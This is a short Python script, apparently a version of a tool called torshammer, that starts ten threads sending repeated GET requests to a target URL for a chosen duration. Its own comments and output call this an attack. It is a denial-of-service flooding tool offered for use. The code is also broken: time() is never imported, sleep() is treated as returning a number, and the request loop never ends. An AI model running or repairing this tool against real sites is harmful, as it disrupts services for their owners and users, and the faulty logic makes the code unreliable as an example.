import sys
import requests
from threading import Thread
from time import sleep

# Check if the script is run with the correct number of arguments
if len(sys.argv) != 3:
    print("Usage: python3 torshammer.py <URL> <duration in seconds>")
    sys.exit(1)

# Read the URL and duration from the command line arguments
target_url = sys.argv[1]
duration = int(sys.argv[2])

# Function to send requests
def send_requests(url):
    while True:
        try:
            # Sending a GET request to the target URL
            response = requests.get(url)
            print(f'Request sent! Status Code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            # Prints the error if the request fails
            print(f'An error occurred: {e}')
        sleep(0.1)  # Wait for 0.1 seconds between requests to avoid flooding

# Function to manage the attack duration
def attack(url, duration):
    # Record the end time
    end_time = sleep(duration) + time()
    # Start sending requests until the duration is up
    while time() < end_time:
        send_requests(url)

# Main function
if __name__ == "__main__":
    # Creating threads to simulate multiple clients
    threads = []
    for i in range(10):  # Adjust the number of threads based on your testing needs
        t = Thread(target=attack, args=(target_url, duration))
        t.start()
        threads.append(t)
    
    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("Attack finished!")
